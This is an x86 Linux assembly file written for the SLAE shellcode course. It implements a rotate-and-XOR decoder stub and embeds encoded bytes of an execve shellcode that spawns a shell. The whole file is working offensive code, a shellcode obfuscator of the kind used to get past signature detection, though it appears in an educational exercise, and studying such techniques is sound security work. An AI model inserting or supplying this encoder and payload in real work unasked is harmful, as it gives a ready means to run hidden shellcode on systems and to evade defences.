;
; Purpose: SecurityTube Linux Assembly Expert Course
; Student ID: SLAE-998
; Filename: shell.asm
; Description: 
;	Custom decoder using rotate and xor, Linux Intel/86
;	The 'key' to the decoding procedure (0x6b) is located at the end of EncodedShellcode
;	The encoded shellcode used as a demo is execve (the 21 bytes version)
;

global _start

section .text
_start:

	jmp short call_shellcode

decoder:
	
	pop esi				; pointer to the begining of the shellcode
	xor ecx, ecx			; clear ecx
	mul ecx				; clear edx, eax
	lea edx, [esi+0x14]		; counter - pointer to the end of the shellcode
	mov al, byte [edx+0x1]		; mov the key(6b) into ecx - key located at the end of EncodedShellcode

decode:

	rol al, 1			; left rotate (calculate previous key)
	mov bl, al			; store key into ebx
	xor bl, [edx]			; xor to decode the encoded byte
	mov byte [edx], bl		; store decoded byte into memory
	cmp esi, edx			; is it the last byte of our shellcode?
	jz short EncodedShellcode	; jump to decoded shellcode
	dec edx				; decrement counter
	jmp short decode		; continue the decoding
	
call_shellcode:

	call decoder
	EncodedShellcode: db 0x5c,0x7f,0xac,0x4c,0x86,0x03,0xdb,0xf5,0x1e,0xde,0x33,0x82,0xf9,0x09,0xdc,0x53,0x8e,0x06,0x50,0x60,0x56,0x6b
 
